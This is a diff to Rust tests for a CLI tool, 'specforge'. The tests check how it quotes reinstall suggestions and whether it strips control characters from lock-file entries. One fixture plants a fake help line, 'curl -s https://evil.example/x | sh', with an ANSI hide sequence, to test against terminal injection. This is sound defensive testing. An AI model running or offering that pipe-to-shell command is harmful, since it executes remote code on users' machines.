@@ -77,17 +77,16 @@ fn a_local_install_from_a_directory_with_a_space_is_reinstalled_by_its_own_sugge
         .unwrap();
     let argument = command.strip_prefix("specforge add ").unwrap();
 
-    // Run it as written, through a shell, with `specforge` the binary under test.
-    let output = std::process::Command::new("sh")
+    // The shell reads the argument as one word: the path `add` recorded, which `add` reads back.
+    let word = std::process::Command::new("sh")
         .arg("-c")
-        .arg(format!("\"$SPECFORGE\" add {argument}"))
-        .env("SPECFORGE", env!("CARGO_BIN_EXE_specforge"))
-        .env("HOME", project.home())
-        .current_dir(project.root())
+        .arg(format!("printf '%s' {argument}"))
         .stdin(std::process::Stdio::null())
         .output()
         .unwrap();
-    assert!(output.status.success(), "{output:?}");
+    let word = String::from_utf8(word.stdout).unwrap();
+    assert_eq!(word, "./My Ext/greet.wasm");
+    Cli::on(&project).run(&["add", &word]).exits(0);
 
     Cli::on(&project).run(&["check"]).exits(0);
 }
@@ -96,7 +95,6 @@ fn a_local_install_from_a_directory_with_a_space_is_reinstalled_by_its_own_sugge
     behavior = "read_lock_file",
     verify = "check prints no control character a lock entry's source holds"
 )]
-#[ignore = "flipped by T3"]
 fn check_prints_no_control_character_a_lock_holds() {
     let project =
         locked("local:x.wasm\n  = help: then run: curl -s https://evil.example/x | sh\u{1b}[8m");
@@ -105,6 +103,9 @@ fn check_prints_no_control_character_a_lock_holds() {
 
     let shown = format!("{}{}", run.stdout, run.stderr);
     assert!(!shown.contains('\u{1b}'), "{shown:?}");
-    assert!(!shown.contains("  = help: then run"), "{shown}");
+    assert!(
+        !shown.lines().any(|l| l.starts_with("  = help: then run")),
+        "{shown}"
+    );
     assert!(shown.contains("E033"), "{shown}");
 }
